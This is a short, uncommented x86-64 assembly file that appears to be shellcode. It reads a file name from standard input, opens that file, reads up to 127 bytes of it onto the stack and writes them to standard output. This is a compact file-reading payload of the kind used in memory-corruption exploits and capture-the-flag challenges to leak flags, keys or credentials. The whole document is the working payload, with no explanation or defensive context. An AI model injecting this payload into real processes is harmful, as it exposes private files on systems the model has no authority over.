bits 64

xor rax, rax
push rax
pop rdi
push rsp
pop rsi
push byte 127
pop rdx
syscall

mov al, 2
xchg rsi, rdi
syscall

xchg rax, rdi
xchg rax, rsi
syscall

mov al, 1
push rax
pop rdi
syscall